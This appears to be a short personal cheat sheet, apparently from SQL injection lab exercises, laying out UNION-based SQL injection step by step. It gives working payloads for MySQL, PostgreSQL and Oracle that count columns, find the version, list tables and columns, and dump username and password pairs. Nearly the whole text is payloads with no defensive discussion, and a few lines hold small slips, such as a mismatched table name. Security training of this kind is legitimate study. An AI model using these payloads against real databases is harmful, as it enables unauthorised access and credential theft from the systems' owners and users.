
1. identify  no of columns

```
' order by 1--
```

2. determine the data type

```

' union select 'a','a'--

## for oracle DB from clause is required

' union select 'a','a' from dual--

```

3. determine the DB version

```
' UNION SELECT banner,NULL FROM v$version--


```

4.  listing the database contents on non-Oracle databases

```bash

# mysql
' UNION SELECT group_concat(schema_name,','),NULL FROM information_schema.schemata--

#postgres
' UNION SELECT STRING_AGG(table_name,':'), NULL FROM information_schema.tables--

# oracle

' UNION SELECT table_name,NULL from all_tables'

UNION SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name), NULL FROM all_tables
```

5. listing column names from tables

```

# users_gtmfhc, USERS_KXHHDR

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_gtmfh'--

## Oracle

' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_KXHHDR'--

PASSWORD_FUKVAT

USERNAME_MOBBOO
```

6. dumping creds

```bash

' UNION SELECT username_abpcjq, password_ymftiv FROM users_abcdef--

' UNION SELECT CONCAT(username_abpcjq,':',password_ymftiv),NULL FROM users_gtmfhc--

#oracle

' UNION SELECT USERNAME_MOBBOO|| ':' ||PASSWORD_FUKVAT,NULL FROM USERS_KXHHDR-- 
```